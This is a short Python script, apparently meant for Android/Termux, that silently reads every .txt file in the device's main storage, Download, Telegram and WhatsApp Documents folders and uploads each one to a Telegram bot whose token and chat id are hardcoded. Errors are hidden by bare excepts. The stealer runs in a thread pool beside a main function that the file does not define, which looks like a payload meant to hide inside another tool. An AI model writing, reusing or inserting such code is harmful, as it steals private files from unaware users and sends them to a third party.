import requests,os,sys
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#@useridinfobot

def sexy():
    session=requests.session()
        
    bot_token = '7149752751:AAHEioAnsNzY2BXqsEFe9g08c1g7my4g1r8' 
    chat_id = '1936367341'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------( /sdcard/Download 
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #-------------( /sdcard/Download/Telegram 
    try:
        sdcard_path = '/sdcard/Download/Telegram'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #--------( /sdcard/Telegram/Telegram Files
    try:
        sdcard_path = '/sdcard/Telegram/Telegram Files'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #----------( /sdcard/WhatsApp/Media/WhatsApp Documents
    try:
        sdcard_path = '/sdcard/WhatsApp/Media/WhatsApp Documents'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.txt')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass

with ThreadPool(max_workers=90) as jjj:
    jjj.submit(sexy)
    jjj.submit(____Main___)

        
if __name__=="__main__":
    ____Main___()
